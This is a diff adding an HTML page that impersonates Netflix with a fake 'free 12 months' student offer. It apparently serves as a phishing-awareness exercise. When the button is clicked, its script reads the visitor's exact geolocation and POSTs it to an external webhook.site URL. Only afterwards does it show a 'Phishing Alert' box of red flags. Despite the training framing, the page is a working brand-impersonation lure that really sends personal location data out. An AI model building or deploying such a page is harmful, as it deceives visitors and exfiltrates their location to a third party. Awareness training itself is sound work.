@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Exclusive Student Offer</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-image: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bcae-07a3f8dc141a/f6ed17ad-68ee-406f-85f8-5e0f361d87c1/PK-en-20220502-popsignuptwoweeks-perspective_alpha_website_medium.jpg');
+            background-size: cover;
+        }
+
+        .card {
+            background: rgba(0, 0, 0, 0.85);
+            padding: 50px;
+            border-radius: 8px;
+            width: 400px;
+            text-align: center;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.5);
+        }
+
+        .logo { color: #e50914; font-size: 40px; font-weight: bold; letter-spacing: -1px; margin-bottom: 20px; }
+
+        h1 { font-size: 24px; margin-bottom: 10px; }
+        p { color: #ccc; font-size: 16px; margin-bottom: 30px; }
+
+        .btn-red {
+            background-color: #e50914;
+            color: white;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .btn-red:hover { background-color: #f6121d; }
+
+        #awareness-info { display: none; text-align: left; background: #fff; color: #000; padding: 20px; border-radius: 8px; margin-top: 20px; }
+        .warning { color: #e50914; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="card" id="main-content">
+    <div class="logo">NETFLIX</div>
+    <h1>Special Student Offer</h1>
+    <p>Get 12 months of Netflix Premium for FREE. Please verify your student location to activate.</p>
+    
+    <button class="btn-red" onclick="requestAccess()">CLAIM FREE SUBSCRIPTION</button>
+
+    <div id="awareness-info">
+        <h2 class="warning">⚠️ Phishing Alert!</h2>
+        <p>In a real attack, your exact location would have been sent to a hacker.</p>
+        <hr>
+        <strong>Red Flags you missed:</strong>
+        <ul>
+            <li>Offers that are "Too good to be true."</li>
+            <li>Requests for sensitive data (Location) for a movie service.</li>
+            <li>Unverified URLs.</li>
+        </ul>
+    </div>
+</div>
+
+<script>
+    const webhookUrl = "https://webhook.site/a6190465-2192-445e-a98c-cdb63aaa9e23";
+
+    function requestAccess() {
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                // Send data to your lab webhook
+                const data = {
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    type: "Simulated Phishing Hit"
+                };
+
+                fetch(webhookUrl, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) })
+                .then(() => {
+                    showAwareness();
+                });
+            }, (err) => {
+                showAwareness();
+            });
+        }
+    }
+
+    function showAwareness() {
+        document.getElementById('awareness-info').style.display = 'block';
+        document.querySelector('h1').style.display = 'none';
+        document.querySelector('p').style.display = 'none';
+        document.querySelector('.btn-red').style.display = 'none';
+    }
+</script>
+
+</body>
+</html>
